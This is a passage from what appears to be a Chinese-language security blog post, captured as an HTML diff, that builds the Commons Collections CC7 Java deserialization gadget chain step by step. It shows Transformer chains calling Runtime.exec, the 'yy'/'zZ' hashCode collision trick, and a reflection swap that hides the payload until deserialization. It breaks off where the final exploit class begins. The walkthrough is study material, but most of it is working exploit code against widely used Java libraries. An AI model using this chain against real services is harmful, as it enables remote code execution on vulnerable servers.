</span><span style="color: #E5C07B">K</span><span style="color: #E06C75"> key</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">V</span><span style="color: #E06C75"> value)</span></span>
+<span class="line"><span style="color: #E06C75">        throws </span><span style="color: #E5C07B">StreamCorruptedException</span></span>
+<span class="line"><span style="color: #E06C75">    {</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (value </span><span style="color: #56B6C2">==</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #E06C75">) {</span></span>
+<span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">throw</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> java</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">io</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">StreamCorruptedException</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #E06C75">        }</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #7F848E; font-style: italic">// Makes sure the key is not already in the hashtable.</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #7F848E; font-style: italic">// This should not happen in deserialized version.</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">int</span><span style="color: #E06C75"> hash </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">key</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">hashCode</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">int</span><span style="color: #E06C75"> index </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> (hash </span><span style="color: #56B6C2">&amp;</span><span style="color: #E06C75"> </span><span style="color: #D19A66">0x7FFFFFFF</span><span style="color: #E06C75">) </span><span style="color: #56B6C2">%</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">tab</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">length</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">for</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">Entry</span><span style="color: #ABB2BF">&lt;</span><span style="color: #C678DD">?</span><span style="color: #ABB2BF">,</span><span style="color: #C678DD">?</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> e </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> tab[index] </span><span style="color: #ABB2BF">;</span><span style="color: #E06C75"> e </span><span style="color: #56B6C2">!=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">;</span><span style="color: #E06C75"> e </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">e</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">next</span><span style="color: #E06C75">) {</span></span>
+<span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> ((</span><span style="color: #E5C07B">e</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">hash</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">==</span><span style="color: #E06C75"> hash) </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">e</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">key</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">equals</span><span style="color: #ABB2BF">(key)</span><span style="color: #E06C75">) {     </span><span style="color: #7F848E; font-style: italic">//调用在这里</span></span>
+<span class="line"><span style="color: #E06C75">                </span><span style="color: #C678DD">throw</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> java</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">io</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">StreamCorruptedException</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #E06C75">            }</span></span>
+<span class="line"><span style="color: #E06C75">        }</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #7F848E; font-style: italic">// Creates the new entry.</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">SuppressWarnings</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;unchecked&quot;</span><span style="color: #E06C75">)</span></span>
+<span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">Entry</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">K</span><span style="color: #ABB2BF">,</span><span style="color: #E5C07B">V</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> e </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">Entry</span><span style="color: #56B6C2">&lt;</span><span style="color: #E06C75">K</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75">V</span><span style="color: #56B6C2">&gt;</span><span style="color: #E06C75">)tab[index]</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">        tab[index] </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Entry</span><span style="color: #ABB2BF">&lt;&gt;</span><span style="color: #E06C75">(hash</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> key</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> value</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> e)</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">        count</span><span style="color: #ABB2BF">++;</span></span>
+<span class="line"><span style="color: #E06C75">    }</span></span></code></pre></div></div></figure>
+</li>
+<li><p>查看<code>reconstitutionPut</code>的调用</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251204203911558.png" srcset="/img/loading.gif" lazyload alt="image-20251204203911502"></p>
+<p>发现正好在这个类的readObject方法里面</p>
+</li>
+</ul>
+<h2 id="构建-1"><a href="#构建-1" class="headerlink" title="构建"></a>构建</h2><ul>
+<li><p>跟上面一样，到lazymap都贴下来</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">Transformer</span><span style="color: #E06C75">[] transformers</span><span style="color: #56B6C2">=</span><span style="color: #E06C75">{</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">ConstantTransformer</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">Runtime</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #E06C75">)</span><span style="color: #ABB2BF">,</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">InvokerTransformer</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;getMethod&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Class</span><span style="color: #E06C75">[]{</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">,</span><span style="color: #E5C07B">Class</span><span style="color: #E06C75">[]</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #E06C75">}</span><span style="color: #ABB2BF">,</span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Object</span><span style="color: #E06C75">[]{</span><span style="color: #98C379">&quot;getRuntime&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">null</span><span style="color: #E06C75">})</span><span style="color: #ABB2BF">,</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">InvokerTransformer</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;invoke&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Class</span><span style="color: #E06C75">[]{</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">,</span><span style="color: #E5C07B">Object</span><span style="color: #E06C75">[]</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #E06C75">}</span><span style="color: #ABB2BF">,</span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Object</span><span style="color: #E06C75">[]{</span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">null</span><span style="color: #E06C75">})</span><span style="color: #ABB2BF">,</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">InvokerTransformer</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;exec&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Class</span><span style="color: #E06C75">[]{</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #E06C75">}</span><span style="color: #ABB2BF">,</span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Object</span><span style="color: #E06C75">[]{</span><span style="color: #98C379">&quot;calc&quot;</span><span style="color: #E06C75">})</span></span>
+<span class="line"><span style="color: #E06C75">}</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E5C07B">ChainedTransformer</span><span style="color: #E06C75"> chainedTransformer </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">ChainedTransformer</span><span style="color: #E06C75">(transformers)</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E5C07B">HashMap</span><span style="color: #E06C75"> map </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">HashMap</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E5C07B">Map</span><span style="color: #E06C75"> lazymap </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">LazyMap</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">decorate</span><span style="color: #ABB2BF">(map, chainedTransformer);</span></span></code></pre></div></div></figure>
+</li>
+<li><p>看一下reconstitutionPut</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251204211143574.png" srcset="/img/loading.gif" lazyload alt="image-20251204211143517"></p>
+<p>这里对传进的 Entry 对象数组进行了循环，逐个调用<code>e.key.equals(key)</code>，这里传进去的参数key如果是我们可控的，那么<code>AbstractMap.equals()</code>中的m就是我们可控的。</p>
+<p>从本质上来说，我们需要在入口类这里传进去恶意的 key，接着调用 key.equals() 即可。</p>
+</li>
+<li><p>编写测试</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">Hashtable</span><span style="color: #E06C75"> hashtable </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">Hashtable</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E5C07B">hashtable</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(lazyMap, </span><span style="color: #98C379">&quot;111&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #61AFEF">serialize</span><span style="color: #E06C75">(hashtable)</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #61AFEF">unserialize</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;ser.bin&quot;</span><span style="color: #E06C75">)</span><span style="color: #ABB2BF">;</span></span></code></pre></div></div></figure>
+
+<p>发现弹不出来计算机</p>
+<p>打个断点调试一下</p>
+<ul>
+<li><p>把断点打在了 <code>AbstractMap.equals()</code> 的地方、</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251204211926847.png" srcset="/img/loading.gif" lazyload alt="image-20251204211926732"></p>
+<p>结果发现居然没有执行到 <code>.equals()</code> 这个方法</p>
+</li>
+</ul>
+</li>
+<li><p>向我们优秀在张师傅取取经（附上她的博客地址<a target="_blank" rel="noopener" href="https://bxhhf.github.io/2025/05/13/CC5_CC7%EF%BC%89">https://bxhhf.github.io/2025/05/13/CC5_CC7）</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251204212545679.png" srcset="/img/loading.gif" lazyload alt="image-20251204212545438"></p>
+<p>这里的链子比我们多了一个 map，而且将两个 map 进行了比较</p>
+<ul>
+<li><p><strong>为什么调用的两次<code>put()</code>其中map中key的值分别为yy和zZ?</strong></p>
+<p>第二次调用 <code>reconstitutionPut()</code> 进入到 for 循环的时候，此时 e 是从 tab 中取出的 lazyMap1 ，然后进入到判断中，要经过 <code>(e.hash == hash)</code> 判断为真才能走到我们想要的 <code>e.key.equal()</code> 方法中。这里判断要求取出来的 lazyMap1 对象的hash值要等都现在对象也就是 lazyMap2 的hash值，这里的hash值是通过 lazyMap 对象中的 <code>key.hashCode()</code> 得到的，也就是说 lazyMap1 的 hash 值就是 <code>&quot;yy&quot;.hashCode()</code> ，lazyMap2 的 hash 值就是 <code>&quot;zZ&quot;.hashCode()</code> ，而在 java 中有一个小 bug：</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #98C379">&quot;yy&quot;</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">hashCode</span><span style="color: #ABB2BF">()</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">==</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;zZ&quot;</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">hashCode</span><span style="color: #ABB2BF">()</span></span></code></pre></div></div></figure>
+
+<p><code>yy</code> 和 <code>zZ</code> 由 <code>hashCode()</code> 计算出来的值是一样的。正是这个小 bug 让这里能够利用，所以这里我们需要将 map 中 <code>put()</code> 的值设置为 <code>yy</code> 和 <code>zZ</code>，才能走到我们想要的 <code>e.key.equal()</code> 方法中。</p>
+</li>
+<li><p><strong>为什么在调用完 <code>HashTable.put()</code> 之后，还需要在 map2 中 <code>remove()</code> 掉 yy？</strong></p>
+<p>这是因为 <code>HashTable.put()</code> 实际上也会调用到 <code>equals()</code> 方法：</p>
+<p>当调用完 <code>equals()</code> 方法后，LazyMap2 的 key 中就会增加一个 yy 键：</p>
+<p>这就不能满足 hash 碰撞了，构造序列化链的时候是满足的，但是构造完成之后就不满足了，那么经过对方服务器反序列化也不能满足 hash 碰撞了，也就不会执行系统命令了，所以就在构造完序列化链之后手动删除这多出来的一组键值对。</p>
+</li>
+<li><p>修改测试</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> hashMap1 </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;&gt;</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> hashMap2 </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;&gt;</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #E5C07B">Map</span><span style="color: #E06C75"> decorateMap1 </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">LazyMap</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">decorate</span><span style="color: #ABB2BF">(hashMap1, chainedTransformer);</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #E5C07B">decorateMap1</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;yy&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">);</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #E5C07B">Map</span><span style="color: #E06C75"> decorateMap2 </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">LazyMap</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">decorate</span><span style="color: #ABB2BF">(hashMap2, chainedTransformer);</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #E5C07B">decorateMap2</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;zZ&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">);</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #E5C07B">Hashtable</span><span style="color: #E06C75"> hashtable </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">Hashtable</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #E5C07B">hashtable</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(decorateMap1, </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">);</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #E5C07B">hashtable</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(decorateMap2, </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">);</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #E5C07B">decorateMap2</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">remove</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;yy&quot;</span><span style="color: #ABB2BF">);</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #61AFEF">serialize</span><span style="color: #E06C75">(hashtable)</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #61AFEF">unserialize</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;ser.bin&quot;</span><span style="color: #E06C75">)</span><span style="color: #ABB2BF">;</span></span></code></pre></div></div></figure>
+
+<p>发现可以弹出计算器</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251204213546541.png" srcset="/img/loading.gif" lazyload alt="image-20251204213546439"></p>
+</li>
+<li><p>但是</p>
+<p>现在执行的话会跳出两个计算器，在序列化的时候会跳出一个，所以我们要先将序列化的这个过程赋为常数，让其反序列化的时候弹出计算器。（类似于<code>urldns</code>的那一套）</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">ChainedTransformer</span><span style="color: #E06C75"> chainedTransformer </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">ChainedTransformer</span><span style="color: #E06C75">(</span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Transformer</span><span style="color: #E06C75">[]{})</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> hashMap1 </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;&gt;</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> hashMap2 </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;&gt;</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #E5C07B">Map</span><span style="color: #E06C75"> decorateMap1 </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">LazyMap</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">decorate</span><span style="color: #ABB2BF">(hashMap1, chainedTransformer);</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #E5C07B">decorateMap1</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;yy&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">);</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #E5C07B">Map</span><span style="color: #E06C75"> decorateMap2 </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">LazyMap</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">decorate</span><span style="color: #ABB2BF">(hashMap2, chainedTransformer);</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #E5C07B">decorateMap2</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;zZ&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">);</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #E5C07B">Hashtable</span><span style="color: #E06C75"> hashtable </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">Hashtable</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #E5C07B">hashtable</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(decorateMap1, </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">);</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #E5C07B">hashtable</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(decorateMap2, </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">);</span><span style="color: #E06C75">  </span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #7F848E; font-style: italic">//加了一个这个</span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #E5C07B">Class</span><span style="color: #E06C75"> c </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ChainedTransformer</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #E5C07B">Field</span><span style="color: #E06C75"> field </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">c</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;iTransformers&quot;</span><span style="color: #ABB2BF">);</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #E5C07B">field</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #E5C07B">field</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">set</span><span style="color: #ABB2BF">(chainedTransformer, transformers);</span><span style="color: #E06C75">  </span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #E5C07B">decorateMap2</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">remove</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;yy&quot;</span><span style="color: #ABB2BF">);</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #61AFEF">serialize</span><span style="color: #E06C75">(hashtable)</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #61AFEF">unserialize</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;ser.bin&quot;</span><span style="color: #E06C75">)</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> }</span></span></code></pre></div></div></figure></li>
+</ul>
+</li>
+</ul>
+<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">CC7Test</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span>
